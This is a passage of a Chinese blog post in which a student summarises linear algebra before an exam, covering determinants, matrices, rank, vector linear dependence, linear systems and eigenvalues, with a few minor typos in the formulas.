        <content type="html"><![CDATA[<p>Update 2019-07-01</p><p>…写不下去了 再这样写下去可能药丸<br>先做题了…</p><ul><li>第三章第二节</li></ul><hr><p>Update 2019-07-02 11:00</p><p>差不多施工完成了..下午就考线代.. ball ball 让我全会</p><hr><h2 id="第一章-行列式"><a href="#第一章-行列式" class="headerlink" title="第一章 行列式"></a>第一章 行列式</h2><h3 id="第一节-二阶与三阶行列式"><a href="#第一节-二阶与三阶行列式" class="headerlink" title="第一节 二阶与三阶行列式"></a>第一节 二阶与三阶行列式</h3><h3 id="第二节-n-阶行列式的定义"><a href="#第二节-n-阶行列式的定义" class="headerlink" title="第二节 $n$阶行列式的定义"></a>第二节 $n$阶行列式的定义</h3><p>逆序数为奇数的排列叫做<strong>奇排列</strong>，逆序数为偶数的排列叫做<strong>偶排列</strong>。</p><p>在排列中，将任意两个元素对调，其余元素保持不动，这种作出新排列的方法叫做<strong>对换</strong>，将相邻两个元素对换，叫做<strong>相邻对换</strong></p><ul><li>定理1.1 一个排列中任意两个元素对换，排列改变奇偶性</li></ul><script type="math/tex; mode=display">\left | \begin{matrix}a_{11} & \cdots & a_{1n}\\\vdots & \ddots & \vdots\\a_{n1} & \cdots & a_{nn}\end{matrix}\right | = \sum (-1)^{\tau p_1p_2...p_n}a_{1p_1}a_{2p_2}...a_{np_n}</script><p>其中$\tau$为排列中逆序数</p><p>上三角行列式和下三角行列式叫做<strong>对角行列式</strong></p><script type="math/tex; mode=display">\left | \begin{matrix}a_{11} & & & \\ & a_{22} & &\\& & \ddots & \\ & & & a_{nn}\end{matrix}\right | = a_{11}a_{22}...a_{nn}</script><h3 id="第三节-行列式的性质"><a href="#第三节-行列式的性质" class="headerlink" title="第三节 行列式的性质"></a>第三节 行列式的性质</h3><p>$D$的转置行列式记作$D^{T}$或$D’$</p><ul><li>性质1 $D=D^{T}$</li><li>性质2 交换行列式的两行或两列，行列式改变符号</li><li>推论1 如果行列式有两行或两列完全相同，则此行列式等于零</li><li>性质3 行列式中某一行或列的各元素有公因子，则可将公因子提到行列式符号的外面</li><li>推论2 行列式的某一行或列所有元素都乘以同一个数$k$，等于用数$k$乘此行列式</li><li>推论3 行列式的某一行或列的元素全为零食，行列式的值等于零</li><li>性质4 若行列式中有两行或列的元素对应成比例，则此行列式的值等于零</li><li>性质5 若行列式的某一行或列的元素都是两数之和，那么可以将他们分成两个行列式<script type="math/tex; mode=display">D=\begin{vmatrix}a_{11} & a_{12} & \cdots & a_{1i}+a_{1i}' & \cdots & a_{1n}\\ a_{21} & a_{22} & \cdots & a_{2i}+a_{2i}' & \cdots & a_{2n}\\ \vdots & \vdots &  & \vdots &  & \vdots \\ a_{n1} & a_{n2} & \cdots & a_{ni}+a_{ni}' & \cdots & a_{nn}\end{vmatrix}=\begin{vmatrix}a_{11} & a_{12} & \cdots & a_{1i} & \cdots & a_{1n}\\ a_{21} & a_{22} & \cdots & a_{2i} & \cdots & a_{2n}\\ \vdots & \vdots &  & \vdots &  & \vdots \\ a_{n1} & a_{n2} & \cdots & a_{ni} & \cdots & a_{nn}\end{vmatrix}+\begin{vmatrix}a_{11} & a_{12} & \cdots & a_{1i}' & \cdots & a_{1n}\\ a_{21} & a_{22} & \cdots & a_{2i}' & \cdots & a_{2n}\\ \vdots & \vdots &  & \vdots &  & \vdots \\ a_{n1} & a_{n2} & \cdots & a_{ni}' & \cdots & a_{nn}\end{vmatrix}</script></li><li>性质6 把行列式的某一行或列各元素乘以同一数$k$后加到另一行或列对应的元素上去，行列式的值不变</li></ul><h3 id="第四节-行列式按一行或列展开"><a href="#第四节-行列式按一行或列展开" class="headerlink" title="第四节 行列式按一行或列展开"></a>第四节 行列式按一行或列展开</h3><p>在$n$阶行列式中，划去元素$a_{ij}$所在的行和列，余下的$n-1$阶行列式，称为元素$a_{ij}$的<strong>余子式</strong>，记为$M_{ij}$，余子式前面冠以符号$(-1)^{i+j}$，称为元素$a_{ij}$的<strong>代数余子式</strong>，记为$A_{ij}=(-1)^{i+j}M_{ij}$</p><ul><li>引理1 一个$n$阶行列式$D$，如果第$i$行所有元素除$a_{ij}$外全为零，则行列式$D=a_{ij}A_{ij}$</li><li>定理1.4 行列式等于它的任一行或列的各元素与其对应的代数余子式的乘积之和，即<script type="math/tex; mode=display">D=a_{1j}A_{1j}+a_{2j}A_{2j}+...+a_{nj}A_{nj}</script>或<script type="math/tex; mode=display">D=a_{i1}A_{i1}+a_{i2}A_{i2}+...+a_{in}A_{in}</script></li></ul><p>这个定理称为<strong>行列式按行（列）展开法则</strong></p><p>范德蒙德（Vandermonde）行列式</p><script type="math/tex; mode=display">D_n=\begin{vmatrix}1&1&1&\ldots&1\\x_1&x_2&x_3&\ldots&x_{n}\\x_1^2&x_2^2&x_3^2&\ldots&x_{n}^2\\\vdots&\vdots&\vdots&\ddots&\vdots\\x_1^{n-1}&x_2^{n-1}&x_3^{n-1}&\ldots&x_{n}^{n-1}\\\end{vmatrix}=\Pi_{n\geqslant i > j \geqslant 1}(x_i-x_j)</script><ul><li><p>推论1 行列式任一行或列的元素与另一行或列的对应元素代数余子式乘积之和等于零，即</p><script type="math/tex; mode=display">a_{i1}A_{j1}+a_{i2}A_{j2}+...+a_{in}A{jn}=0(i\neq j)</script><p>或</p><script type="math/tex; mode=display">a_{1i}A_{1j}+a_{2i}A_{2j}+...+a_{ni}A{nj}=0(i\neq j)</script></li><li><p>定义1.3 在一个$n$阶行列式$D$中，任意取定$k$行$k$列$(k\leqslant n)$，位于这些行与列的交点处的$k^2$个元素，按原来的顺序构成的$k$阶行列式$M$，称为行列式$D$的一个$k$阶子式；而在$D$中划去这$k$行$k$列后余下的元素，按原来的顺序构成的$n-k$阶行列式$N$，称为$k$阶子式$M$的余子式，$(-1)^{(i_1+i_2+…+i_n)+(j_1+j_2+…+j_n)}$称为$k$阶子式$M$的代数余子式</p></li><li><p>定理1.5 设在行列式$D$中任意选定$k(1\leqslant k\leqslant n-1)$行或列，则行列式$D$等于由这$k$行或列元素组成的一切$k$阶子式与它们对应的代数余子式的乘积之和。</p></li></ul><h3 id="第五节-克莱默法则"><a href="#第五节-克莱默法则" class="headerlink" title="第五节 克莱默法则"></a>第五节 克莱默法则</h3><ul><li>定理1.6（克莱默法则） 若方程组<script type="math/tex; mode=display">\left\{\begin{matrix}a_{11}x_1+a_{12}x_2+...+a_{1n}x_n=b_1\\ a_{21}x_1+a_{22}x_2+...+a_{2n}x_n=b_2\\ \cdots \cdots\\ a_{n1}x_1+a_{n2}x_2+...+a_{nn}x_n=b_n\end{matrix}\right.</script>的系数行列式<script type="math/tex; mode=display">D=\left | \begin{matrix}a_{11} & a_{12} & \cdots & a_{1n}\\a_{21} & a_{22} & \cdots & a_{2m}\\\vdots & \vdots & & \vdots\\a_{n1} & a_{n2} & \cdots & a_{nn}\end{matrix} \right |\neq 0</script>则方程组有唯一解，且可表示为<script type="math/tex; mode=display">x_1=\frac{D_1}{D},x_2=\frac{D_2}{D},...,x_n=\frac{D_n}{D}</script>其中$D_j$是将$D$中的第$j$列换成常数项所得的行列式，即<script type="math/tex; mode=display">D_j=\left | \begin{matrix}a_{11} & \cdots & a_{1,j-1} & b_1 & a_{1,j+1} & \cdots & a_{1n} \\a_{21} & \cdots & a_{2,j-1} & b_1 & a_{2,j+1} & \cdots & a_{2n} \\\vdots & & \vdots & \vdots & \vdots & & \vdots \\a_{n1} & \cdots & a_{n,j-1} & b_n & a_{n,j+1} & \cdots & a_{nn} \\\end{matrix} \right |</script></li></ul><p>使用克莱默法则必须注意<br>（1）未知量的个数与方程的个数要相等<br>（2）系数行列式不为零<br>常数项全为零的线性方程组叫做<strong>齐次线性方程组</strong>；不全为零，就是<strong>非齐次线性方程组</strong>。<br>$x_1=x_2=…=x_n=0$，称为零解，除零解外还有不全为零的解，称为非零解。</p><ul><li>定理1.7 如果齐次线性方程组的系数行列式$D\neq 0$，则齐次线性方程组只有零解。</li><li>定理1.7’ 如果齐次线性方程组有非零解，则它的系数行列式必为零。</li></ul><h2 id="第二章-矩阵"><a href="#第二章-矩阵" class="headerlink" title="第二章 矩阵"></a>第二章 矩阵</h2><h3 id="第一节-矩阵的概念"><a href="#第一节-矩阵的概念" class="headerlink" title="第一节 矩阵的概念"></a>第一节 矩阵的概念</h3><p>定义2.1 由$m\times n$个数$a_{ij}$排成$m$行$n$列的数表，称为$m$行$n$列的<strong>矩阵</strong>，简称<strong>$m\times n$矩阵</strong>，并加一个括号（中括号或小括号），并用大写黑体字母表示，记作$A=\left [ \begin{matrix}a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1n}\\a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2n}\\\vdots &amp; \vdots &amp; &amp; \vdots\\a_{m1} &amp; a_{m2} &amp; \cdots &amp; a_{mn}\end{matrix} \right ]$，其中$a_{ij}$表示矩阵第$i$行第$j$列的元素，矩阵可简记为$A=(a_{ij})_ {m\times n}$或$A=(a_{ij})$，$m\times n$矩阵也简记为$A_{m\times n}$<br>元素是实数的矩阵称为<strong>实矩阵</strong>，是复数的称为<strong>复矩阵</strong>；$m=n$时$A$称为$n$阶<strong>方阵</strong>；只有一行的矩阵称为<strong>行矩阵</strong>；只有一列的矩阵称为<strong>列矩阵</strong>。<br>如果行数和列数相等，则称他们是<strong>同型的</strong>；如果同型并且对应元素相等，则称他们是<strong>相等的</strong>，记作$A=B$。<br>元素全为零的矩阵称为<strong>零矩阵</strong>，记作$O$。<br>恒等变换的系数矩阵$E=\left [ \begin{matrix}1 &amp; 0 &amp; \cdots &amp; 0\\0 &amp; 1 &amp; \cdots &amp; 0\\\vdots &amp; \vdots &amp; &amp; \vdots\\0 &amp; 0 &amp; \cdots &amp; 1<br>\end{matrix} \right ]$，称为<strong>$n$阶单位矩阵</strong>，简称<strong>单位阵</strong>。$E=(\delta_{ij}),\delta_{ij}=\left\{\begin{matrix}1, &amp; i=j\\ 0, &amp; i\neq j \end{matrix}\right.$</p><p>$y_i=\lambda_ix_i$的线性变换的系数矩阵$A=\left [ \begin{matrix}\lambda_1 &amp; 0 &amp; \cdots &amp; 0\\0 &amp; \lambda_2 &amp; \cdots &amp; 0\\\vdots &amp; \vdots &amp; &amp; \vdots\\0 &amp; 0 &amp; \cdots &amp; \lambda_n \end{matrix} \right ]$，称为<strong>对角阵</strong>，特点是不在主对角线的元素都为零，特别的当$\lambda_1=\lambda_2=…=\lambda_n$时称为<strong>数量矩阵</strong>。</p><p>还有上三角矩阵和下三角矩阵，见名知意我就不写了..</p><h3 id="第二节-矩阵的运算"><a href="#第二节-矩阵的运算" class="headerlink" title="第二节 矩阵的运算"></a>第二节 矩阵的运算</h3><ul><li>矩阵的加法，对应元素相加。</li><li>数与矩阵的乘法，对应相乘。</li><li>矩阵与矩阵的相乘，$c_{ij}$等于$A$的第$i$行与$B$的第$j$列的对应元素乘积之和，不满足交换律，分为左乘和右乘。<br>若$AB=BA$，则称$A$与$B$是可交换的。<br>类似定义矩阵的幂<br>$(AB)^k=A^kB^k$<br>$A^2=A$，幂等矩阵</li><li>矩阵的转置：将矩阵行和列一次互换位置，称为$A$的转置，记作$A^{T}$或$A’$<br>满足以下规律：$(A^{T})^{T}=A,(A+B)^{T}=A^{T}+B^{T},(\lambda A)^{T}=\lambda A^{T},(AB)^{T}=B^{T}A^{T}$</li></ul><p>定义2.6 若$A^{T}=A$，那么称$A$为<strong>对称阵</strong>，各元素以主对角线为对称轴对应相等<br>定义2.7 若$A^{T}=-A$，称为<strong>反对称阵</strong>，主对角线的元素全为零</p><h4 id="方阵的行列式"><a href="#方阵的行列式" class="headerlink" title="方阵的行列式"></a>方阵的行列式</h4><p>方阵各元素构成的行列式称为方阵$A$的行列式，记为$|A|$。<br>具有以下性质<br>$|A^{T}|=|A|,|\lambda A|=\lambda ^n|A|,|AB|=|A||B|$<br>$|AB|=|BA|=|A||B|$</p><h3 id="第三节-逆矩阵"><a href="#第三节-逆矩阵" class="headerlink" title="第三节 逆矩阵"></a>第三节 逆矩阵</h3><p>逆变换</p><p>定义2.9 设$A$为$n$阶方阵，若存在$n$阶方阵$B$，使得$AB=BA=E$，则称方阵$A$是可逆的，称$B$是$A$的<strong>逆矩阵</strong>或<strong>逆阵</strong>。</p><p>由定义可知：互为逆矩阵，逆变换的矩阵必为逆矩阵，逆矩阵唯一。</p><blockquote><p>定理2.1 $n$阶方阵$A$可逆的充分必要条件是：$|A|\neq 0$，且当$A$可逆时有</p><script type="math/tex; mode=display">A^{-1}=\frac{1}{|A|}A^{* }</script><p>其中$A^{* }=\left [ \begin{matrix}A_{11} &amp; A_{21} &amp; \cdots &amp; A_{n1} \\A_{12} &amp; A_{22} &amp; \cdots &amp; A_{n2} \\\vdots &amp; \vdots &amp; &amp; \vdots \\A_{1n} &amp; A_{2n} &amp; \cdots &amp; A_{nn} \\\end{matrix} \right ]$，称为$A$的伴随矩阵，$A_{ij}$是$|A|$的元素$a_{ij}$是代数余子式。<br>注意排列顺序是关于主对角线对称的，注意代数余子式，有个$(-1)^{i+j}$。</p></blockquote><p>另外 $AA^{* }=|A|E$；</p><p>$A^{* }A=|A|E$</p><ul><li>推论1 若$A,B$都是$n$阶方阵，且$AB=E$，则$BA=E$</li></ul><p>定义2.10 设$A$为方阵，若$|A|\neq 0$，则称$A$为<strong>非奇异方阵</strong>；若$|A|=0$，则称$A$为<strong>奇异方阵</strong>。<br>可逆方阵即为非奇异方阵，方阵的逆具有以下性质（假设都可逆）</p><ul><li>$(A^{-1})^{-1}=A$</li><li>$\lambda \neq 0,(\lambda A)^{-1}=\frac{1}{\lambda}A^{-1}$</li><li>$(AB)^{-1}=B^{-1}A^{-1}$</li><li>$A^{T}$可逆，$(A^{T})^{-1}=(A^{-1})^{T}$</li><li>$|A^{-1}|=\frac{1}{|A|}=|A|^{-1}$</li></ul><p>几个结论：</p><ul><li><p>设对角阵$\Lambda =\begin{bmatrix}\lambda_1 &amp;  &amp;  &amp; \\  &amp; \lambda_2 &amp;  &amp; \\  &amp;  &amp; \ddots  &amp; \\  &amp;  &amp;  &amp; \lambda_n\end{bmatrix}$，则$\Lambda ^k=\begin{bmatrix}\lambda_1^k &amp;  &amp;  &amp; \\  &amp; \lambda_2^k &amp;  &amp; \\  &amp;  &amp; \ddots  &amp; \\  &amp;  &amp;  &amp; \lambda_n^k\end{bmatrix}$</p></li><li><p>$|A|\neq 0$，$A^0=E,A^{-k}=(A^{-1})^k,A^{\lambda}A^{\mu}=A^{\lambda + \mu},(A^{\lambda})^{\mu}=A^{\lambda \mu}$</p></li></ul><h3 id="第四节-分块矩阵"><a href="#第四节-分块矩阵" class="headerlink" title="第四节 分块矩阵"></a>第四节 分块矩阵</h3><p>定义2.11 用若干条纵线和横线把$A$分成若干个小块，每一个小块构成的小矩阵称为$A$的<strong>子块</strong>，以子块伪元素的矩阵称为$A$的<strong>分块矩阵</strong>。</p><p>若分块方法相同，矩阵相加等于子块对应相加<br>若$A$列分法与$B$行分法相同，得到的子块为对应子块乘积之和，与矩阵乘法相同。<br>$A^{T}=\begin{bmatrix}A_{11}^{T} &amp; \cdots &amp; A_{s1}^{T}\\  \vdots &amp;  &amp; \vdots \\ A_{1r}^{n} &amp;  &amp; A_{sr}^{T}\end{bmatrix}$<br>只有在对角线上有非零子块，且对角线上的子块都是方阵，$A=\begin{bmatrix}A_1 &amp;  &amp;  &amp; \\  &amp; A_2 &amp;  &amp; \\  &amp;  &amp; \ddots  &amp; \\  &amp;  &amp;  &amp; A_s\end{bmatrix}$，此时称$A$为<strong>分块对角矩阵</strong>，则有<br>$|A|=|A_1||A_2|…|A_s|$<br>当$|A_i|\neq 0$时，$A^{-1}=\begin{bmatrix}A_1^{-1} &amp;  &amp;  &amp; \\  &amp; A_2^{-1} &amp;  &amp; \\  &amp;  &amp; \ddots  &amp; \\  &amp;  &amp;  &amp; A_s^{-1}\end{bmatrix}$<br>$A_i,B_i$是同阶方阵$AB=\begin{bmatrix}A_1B_1 &amp;  &amp;  &amp; \\  &amp; A_2B_2 &amp;  &amp; \\  &amp;  &amp; \ddots  &amp; \\  &amp;  &amp;  &amp; A_sB_s\end{bmatrix}$</p><h3 id="第五节-矩阵的秩与矩阵的初等变换"><a href="#第五节-矩阵的秩与矩阵的初等变换" class="headerlink" title="第五节 矩阵的秩与矩阵的初等变换"></a>第五节 矩阵的秩与矩阵的初等变换</h3><p>定义2.12 $m\times n$的矩阵$A$中，任取$k$行$k$列，在行列交叉的$k^2$个元素按原来的次序所构成的$k$阶行列式，称为$A$的$k$阶子式。</p><p>定义2.13 矩阵$A$中不为零的子式的最高阶数称为矩阵$A$的<strong>秩</strong>，记为$rank(A)$，简记为$r(A)$。<br>非奇异方阵的秩等于它的阶数，故非奇异方阵称为<strong>满秩矩阵</strong>，而奇异方阵称为<strong>降秩矩阵</strong>。</p><blockquote><p>定理2.2 若矩阵$A$中至少有一个$k$阶子式不为零，而有所$k+1$阶子式全为零，则$r(A)=k$</p></blockquote><p>矩阵秩的性质</p><ul><li>$r(A_{m\times n}\leqslant \min\{m,n\}$</li><li>$r(A^{T})=r(A),r(\lambda A)=r(A)(\lambda neq 0)$</li><li>$A\sim B,r(A)=r(B)$</li><li>$RQ$可逆，$r(A)=r(PA)=r(AQ)=r(PAQ)$</li><li>$\max \{r(A),r(B)\}\leqslant r(A,B)\leqslant r(A)+r(B)$</li><li>$r(A+B)\leqslant r(A)+r(B)$</li><li>$r(AB)\leqslant \min \{r(A),r(B)\}$</li><li>若$A_{m\times n}\cdot B_{n\times l}=O$，则$r(A)+r(B)\leqslant n$</li><li>若$AB=O$，$A\neq O \nRightarrow B=O$；$|A|\neq 0 \Rightarrow B=O$；$A$列满秩$\Rightarrow B=O$；$B$行满秩$\Rightarrow A=O$</li></ul><p>行阶梯矩阵，行最简形阶梯矩阵（行最简形），标准形$I$（左上角有一个单位矩阵，其他元素都为零）<br>定义2.15 若矩阵$A$经过有限次初等变换后，化为矩阵$B$，则称$A$与$B$等价，记为$A\sim B$</p><ul><li>$A\sim A$</li><li>$A\sim B,B\sim A$</li><li>$A\sim B, B\sim C$则$A\sim C$</li><li>$A\sim B,r(A)=r(B)$</li></ul><p>定义2.16 由单位阵$E$经过一次初等变换得到的方阵称为<strong>初等矩阵</strong></p><blockquote><p>定理2.4 设$A$是一个$m\times n$矩阵，则对$A$施行一次初等行变换，相当于用相应的$m$阶初等矩阵左乘$A$；对$A$施行一次初等列变换，相当于用相应的$n$阶初等矩阵右乘$A$。<br>定理2.5 设$A$为可逆阵，则存在有限个初等矩阵$P_1,P_2,…,P_l$使$A=P_1P_2…P_l$</p><ul><li>推论1 $m\times n$矩阵$A\sim B$的充分必要条件是：存在$m$阶可逆方阵$P$及$n$阶可逆方阵$Q$，使$PAQ=B$。</li></ul></blockquote><p>初等变换求逆矩阵$(A,E)\sim (E,A^{-1})$，$AX=E,(A,B)\sim (E,X)/(E,A^{-1}B)$</p><h2 id="第三章-向量组的线性相关性"><a href="#第三章-向量组的线性相关性" class="headerlink" title="第三章 向量组的线性相关性"></a>第三章 向量组的线性相关性</h2><h3 id="第一节-n-维向量"><a href="#第一节-n-维向量" class="headerlink" title="第一节 $n$维向量"></a>第一节 $n$维向量</h3><p>定义3.1 $n$个有顺序的数$a_1,a_2,…,a_n$所组成的数组$\alpha=(a_1,a_2,…,a_n)$称为$n$维向量，数$a_j$称为向量$\alpha$的第$j$个分量（或坐标）<br>实向量，复向量，行向量，列向量都略了…</p><p>具体相关向量空间、线性组合、线性表示第七章写过了</p><p>平凡子空间（空间本身和零向量）、非平凡子空间</p><h3 id="第二节-向量组的线性相关性"><a href="#第二节-向量组的线性相关性" class="headerlink" title="第二节 向量组的线性相关性"></a>第二节 向量组的线性相关性</h3><p>由若干个同维数的向量所组成的集合称为<strong>向量组</strong>。</p><p>定义3.3 设有$n$为向量组$\alpha_1,\alpha_2,…,\alpha_m$，若存在不全为零的数$c_1,c_2,…,c_m$，使得，$c_1\alpha_1+c_2\alpha_2+…+c_n\alpha_n=0$，则称向量组线性相关；否则称线性无关。当向量组线性无关时，称这个向量组为线性无关（向量）组</p><p>几条结论 </p><ul><li>零向量是线性相关的</li><li>任一非零向量线性无关</li><li>包含零向量的向量组是线性相关的</li><li>两个向量线性相关的充要条件是：它们的对应分量称比例</li></ul><blockquote><p>定理3.1 向量组$\alpha_1,\alpha_2,…,\alpha_m$线性相关的充分必要条件是：这个向量组中至少有一个向量可由其余$m-1$个向量线性表示<br>定理3.2 若$n$维向量组$\alpha_1,\alpha_2,…,\alpha_m$有一个部分组线性相关，则该向量组也线性相关<br>定理3.3 设$\alpha_1,\alpha_2,…,\alpha_m$线性无关，而$\alpha_1,\alpha_2,…,\alpha_m,\beta$线性相关，则$\beta$能由$\alpha_1,\alpha_2,…,\alpha_m$表示，且表示法唯一</p></blockquote><p>定义3.9 若向量组$A$中每一个元素都能由$B$中的元素线性表示，则称向量组$A$能由向量组$B$线性表示，若$B$也能由$A$线性表示，则称向量组$A,B$等价<br>满足 自反性、对称性、传递性</p><h4 id="向量组线性相关性的矩阵判别法"><a href="#向量组线性相关性的矩阵判别法" class="headerlink" title="向量组线性相关性的矩阵判别法"></a>向量组线性相关性的矩阵判别法</h4><blockquote><p>定理3.4 将向量组的两个分量对调，不改变向量组的线性相关性。<br>定理3.5 两个向量组，一个向量组是由另一个向量组添加一个分量所得，若前者线性无关，则后者也线性无关</p><ul><li>推论1 设$r$维向量组的每个向量在相应位置上天上$n-r$个分量成为$n$维向量组，若$r$为向量组线性无关，则$n$维向量组也线性无关，反之$n$维向量组线性相关，则$r$维向量组也线性相关。<br>定理3.6 设$n$维向量组，$r$个向量$(r\leqslant n)$，向量组线性无关的充分必要条件是：矩阵$A$中存在一个不等于零的$r$阶子式</li><li>推论2 $n$个$n$维向量线性无关的充要条件是：它们所构成的方阵行列式不等于零</li><li>推论3 含$n$个方程的$n$元齐次线性方程组$Ax=0$有非零解的充要条件是：系数行列式$|A|=0$</li><li>推论4 $m&gt;n$时，$m$个$n$维向量组必定线性相关</li></ul><p>定理3.6’ 设$r$个$n$维行向量构成矩阵$A$，那么这$r$个向量线性相关的充分必要条件是：$A$中存在不等于零的$r$阶子式。反之，这$r$个向量线性相关的充分必要条件是：没有不等于零的$r$阶子式</p><ul><li>推论5 如果在$m\times n$矩阵$A$中有一个$r$阶子式$D\neq 0$，则含有$D$的相应元素的$r$个行向量及$r$个列向量都线性无关；如果$A$中所有的$r$阶子式全为0，则$A$的任意$r$个行向量及任意$r$个列向量都线性相关。</li></ul></blockquote><p>最大线性无关组的个数就是向量组的秩</p><ul><li>性质1 向量组线性无关的充要条件是：它所含向量的个数等于它的秩。</li><li>性质2 设矩阵$A$的某个$r$阶子式$D$是$A$的最高阶非零子式，则$D$所在的$r$个行向量及$r$个列向量分别是矩阵$A$的行向量组和列向量组的一个最大无关组</li><li>性质3 矩阵$A$的秩等于$A$的行向量组的秩，也等于$A$的列向量组的秩</li><li>性质4 设向量组$A$是向量组$T$的一个最大线性无关组，则向量组$A$与向量组$T$等价</li></ul><blockquote><p>定理3.7 如果向量组$A$有$r$个元素，向量组$B$有$s$个元素，如果$A$能由$B$组线性表示，且$A$组线性无关，则$r\leqslant s$.</p><ul><li>推论6 等价的线性无关向量组所含向量的个数相等。</li><li>推论7 设向量组$A$的秩为$r_1$，向量组$B$的秩为$r_2$，如果$A$组能由$B$组线性表示，则$r_1\leqslant r_2$</li><li>推论8 等价向量组有相同的秩</li><li>推论10 设矩阵$A$中有一个$r$阶子式$D\neq 0$，而包含$D$的相应元素的所有$r+1$阶子式全为零，则$A$中所有$r+1$阶子式全为零，从而$r(A)=r$</li></ul><p>引理1 如果矩阵$A$经初等行（列）变换后变成$B$，则$A$的行（列）向量组和$B$的行（列）向量组等价<br>引理2 设$A,B$都是$m\times n$矩阵，若$A,B$的行向量组等价，则齐次线性方程组$Ax=0$与$Bx=0$同解<br>引理3 若矩阵$A$经过有限次初等行（列）变换后变成$B$，则$A$在任意$k$列（行）详列与$B$中对应的$k$个列（行）向量有相同的线性关系</p></blockquote><h3 id="第三节-向量空间的基、维数与坐标"><a href="#第三节-向量空间的基、维数与坐标" class="headerlink" title="第三节 向量空间的基、维数与坐标"></a>第三节 向量空间的基、维数与坐标</h3><p>详见第七章</p><h2 id="第四章-线性方程组"><a href="#第四章-线性方程组" class="headerlink" title="第四章 线性方程组"></a>第四章 线性方程组</h2><h3 id="第一节-高斯消元法"><a href="#第一节-高斯消元法" class="headerlink" title="第一节 高斯消元法"></a>第一节 高斯消元法</h3><h3 id="第二节-齐次线性方程组"><a href="#第二节-齐次线性方程组" class="headerlink" title="第二节 齐次线性方程组"></a>第二节 齐次线性方程组</h3><blockquote><p>定理4.1 $n$元齐次线性方程组$Ax=0$，存在非零解的充要条件是系数矩阵$A$的秩$r(A)&lt;n$，也即$Ax=0$只有零解的充要条件是$r(A)=n$<br>定理4.2 若$x=\xi_1,x=\xi_2$为齐次线性方程组的两个解，则$x=\xi_1+\xi_2$也是齐次方程组的解，即齐次方程组的任意两个解之和还是它的解。<br>定理4.3 若$x=\xi$是齐次线性方程组的一个解，$k$为任意常数，则$x=k\xi$也是齐次线性方程组的解，即齐次线性方程组的解的任意常数倍也是它的解</p></blockquote><p>定义4.1 设$\xi_1,\xi_2,…,\xi_r$是$Ax=0$的解向量，如果$\xi_1,\xi_2,…,\xi_r$线性无关，$Ax=0$的任一解向量均可由$\xi_1,\xi_2,…,\xi_r$线性表示，则称其为$Ax=0$的<strong>基础解系</strong>。</p><blockquote><p>定理4.4 对于$n$元齐次线性方程组$Ax=0$，如果$r(A)=r&lt;n$，则方程组的基础解系存在，且含$n-r$个解向量，即解空间的维数为$n-r$</p></blockquote><h3 id="第三节-非齐次线性方程组"><a href="#第三节-非齐次线性方程组" class="headerlink" title="第三节 非齐次线性方程组"></a>第三节 非齐次线性方程组</h3><p>若非齐次线性方程组有解，则称方程组是<strong>相容的</strong>，否则称是<strong>不相容的</strong>，矩阵表示$Ax=b$</p><blockquote><p>定理4.5 对于非齐次线性方程组，下面条件等价<br>(1)$Ax=b$有解<br>(2)$b$可由$A$的列向量组线性表示<br>(3)增广矩阵$\widetilde{A}$的秩等于系数矩阵$A$的秩<br>定理4.6 设$\eta_1,\eta_2$是非齐次线性方程组$Ax=b$的阶，则$\eta_1-\eta_2$是对应的齐次线性方程组（也称导出组）$Ax=0$的解<br>定理4.7 如果非齐次线性方程组$Ax=b$有解，则其通解为$\eta=\xi+\eta^{* }$，其中$\xi$是对应$Ax=0$的通解，另一个是$Ax=b$的特解</p></blockquote><p>非齐次线性方程组有解的充分必要条件是：$r(A)=r(\widetilde{A})=r$，且$r=n$时只有唯一解，$r&lt; n$时有无穷多解</p><p>已知基础解系求满足的方程，将基础解系转置，经过初等行变换即可得</p><h2 id="第五章-矩阵的对角化"><a href="#第五章-矩阵的对角化" class="headerlink" title="第五章 矩阵的对角化"></a>第五章 矩阵的对角化</h2><h3 id="第一节-特征值与特征向量"><a href="#第一节-特征值与特征向量" class="headerlink" title="第一节 特征值与特征向量"></a>第一节 特征值与特征向量</h3><p>设$A=a_{ij}$是一个$n$阶方阵，如果存在一个数$\lambda $和一个非零列向量$x=(x_1,x_2,…,x_n)^T$，使得关系式$Ax=\lambda x$成立，则称数$\lambda $为方阵$A$的一个<strong>特征值</strong>，非零向量$x$称为$A$的对应于（或属于）特征值$\lambda $的<strong>特征向量</strong>。</p><ul><li>特征值问题只对方阵而言</li><li>特征向量必须是非零向量</li><li>方阵$A$的每个特征值均对应于无穷多个特征向量，属于同一特征值的特征向量的任意非零线性组合也是属于该特征值的特征向量，$A(kx)=k(Ax)=k(\lambda x)=\lambda (kx),k\neq 0$，$A(x_1+x_2)=Ax_1+Ax_2=\lambda x_1+\lambda x_2=\lambda (x_1+x_2), x_1+x_2\neq 0$</li></ul><p>求法</p><script type="math/tex; mode=display">(A-\lambda E)x=0 , (\lambda E-A)x=0</script><p>有解的充要条件是：系数行列式$|A-\lambda E|=0$，此方程称为方阵$A$的<strong>特征方程</strong>，左端$|A-\lambda E|$是$\lambda $的$n$次多项式，称为方阵$A$的<strong>特征多项式</strong>，记为$f(\lambda )$</p><p>特征值与特征向量的性质</p><ul><li>一个特征向量只能属于一个特征值（相同的看成一个）</li><li>若$\lambda $是方阵$A$的特征值，$x$是其属于$\lambda $的特征向量，则<br>(1) $\mu\lambda$是$\mu A$的特征值，$x$是其属于$\mu \lambda$的特征向量<br>(2) $\lambda ^m$是$A^m$的特征值，$x$是其属于$\lambda ^m$的特征向量<br>(3) 当$|A|\neq 0$时，$\lambda ^{-1}$是$A^{-1}$的特征值，$\lambda ^{-1}|A|$为$A^{*}$的特征值，且$x$为其对应的特征向量。</li><li>$A$与$A^{T}$有相同的特征值</li><li>设$n$阶矩阵$A=(a_{ij})$的$n$个特征值为$\lambda_1,\lambda_2,…, \lambda_n$，则<br>(1) $\sum_{i=1}^n \lambda_i=\sum_{i=1}^na_{ii}=trA$<br>(2) $\lambda 1\lambda 2…\lambda n=|A|$<br>其中$tr A$称为$A$的<strong>迹</strong>，为$A$的主对角线元素之和<br>$A$可逆当且仅当$A$的特征值不为零</li><li>设$\lambda_1,\lambda_2,…\lambda_m$是方阵$A$的$m$个特征值，$p_1,p_2,…,p_m$是依次与之对应的特征向量，如果$\lambda_1,\lambda_2,…\lambda_m$互不相等，则$p_1,p_2,…,p_m$线性无关。</li></ul><h3 id="第二节-相似矩阵"><a href="#第二节-相似矩阵" class="headerlink" title="第二节 相似矩阵"></a>第二节 相似矩阵</h3><h4 id="向量的内积"><a href="#向量的内积" class="headerlink" 